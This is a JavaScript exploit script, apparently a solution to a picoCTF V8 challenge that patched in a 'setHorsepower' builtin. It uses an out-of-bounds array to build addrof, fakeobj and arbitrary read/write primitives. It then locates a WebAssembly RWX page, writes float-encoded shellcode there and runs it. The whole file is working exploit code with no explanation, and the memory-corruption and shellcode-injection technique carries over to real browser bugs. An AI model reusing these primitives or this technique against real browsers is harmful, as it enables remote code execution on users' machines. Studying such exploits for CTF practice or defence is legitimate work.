
var buf = new ArrayBuffer(8);
var f64buf = new Float64Array(buf);
var u64buf = new Uint32Array(buf);

function ftoi(val, size) {
	f64buf[0] = val;
	if(size == 32) {
		return BigInt(u64buf[0]);
	}
	else if(size == 64) {
	       return BigInt(u64buf[0]) + (BigInt(u64buf[1]) << 32n);
	}
}
function itof(val, size) {
	if(size == 32) {
		u64buf[0] = Number(val & 0xffffffffn);
	}
	else if(size == 64) {
		u64buf[0] = Number(val & 0xffffffffn);
		u64buf[1] = Number(val >> 32n);
	}
	
	return f64buf[0];
}
function addrof(obj){
	obj_arr[0] = obj;
	var address = ftoi(oob_arr[19],64) >> 32n;
	return address;
}
function fakeobj(addr){
	oob_arr[19] = itof(BigInt(addr) << 32n,64);
	var fake = obj_arr[0];
	return fake;
}
function aar(addr){
	high = ftoi(oob_arr[40], 64) & 0xffffffff00000000n;
	low = BigInt(addr-0x8n);
	oob_arr[40] = itof( low + high, 64);
	return ftoi(double_arr[0],64);
}
function aaw(addr, value){
	high = addr >> 32n;
	low = addr << 32n;
	oob_arr[53] = itof(low, 64);
	oob_arr[52] = itof(high, 64);

}
function write_shellcode(){
	shellcode = [8.191473375206089e-79, 3.775826202043335e+79, 1.1205295651588473e+253, 7.748604185565308e-304, 2.460307022775963e+257, 1.7734484618746183e-288, 4.089989556334856e+40, 1.7766596360849696e-302, 3.6509617888350745e+206, 4.1942076e-316];
	rwx_high = rwx & 0xffffffffn;
	rwx_low = rwx / 0x100000000n;
	console.log(rwx_low.toString(16), rwx_high.toString(16));
	oob_arr[52] = itof(rwx_low, 64);
	oob_arr[51] = itof(rwx_high << 32n, 64);
	for(let i =0; i<shellcode.length;i++){
		dataview.setFloat64(i*Float64Array.BYTES_PER_ELEMENT, shellcode[i]);
	}

}
var oob_arr = [1.1, 2.2, 3.3, 4.4].setHorsepower(0x100);
var double_map = ftoi(oob_arr[4], 64) & 0xffffffffn;
var obj_arr = [{a:1}, {b:1}];
var double_arr = [1.1, 2.2, 3.3, 4.4];
var object_map = double_map + 0x50n;
console.log("[+] double map : ", double_map.toString(16));
console.log("[+] object map : ", object_map.toString(16));
var target_buffer = new ArrayBuffer(0x500);
var dataview = new DataView(buf);
//oob_arr[52] high
//oob_arr[51] low
oob_arr[52] = itof(0x42424242n, 64);
oob_arr[51] = itof(0x41414141n << 32n, 64);
let wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
let wasmModule = new WebAssembly.Module(wasmCode);
let wasmInstance = new WebAssembly.Instance(wasmModule);
     
let wasmFunction = wasmInstance.exports.main;

let rwx = aar(addrof(wasmInstance) + 0x67n) >> 8n;
console.log("[*] rwx : " + rwx.toString(16));
rwx = rwx + 1n;
// https://www.willsroot.io/2021/04/turboflan-picoctf-2021-writeup-v8.html
//var shellcode = [0x747868, 0x2eb84800, 0x616c662f, 0x50742e67, 0x6ae78948, 0x6a5e00, 0x58026a5a, 0x8948050f, 0xe68948c7, 0x6a5a646a, 0x50f5800, 0x6a5f016a, 0x50f5801, 0x90909090];
console.log("[+] target_buffer : " + addrof(target_buffer).toString(16));
write_shellcode()

wasmFunction();

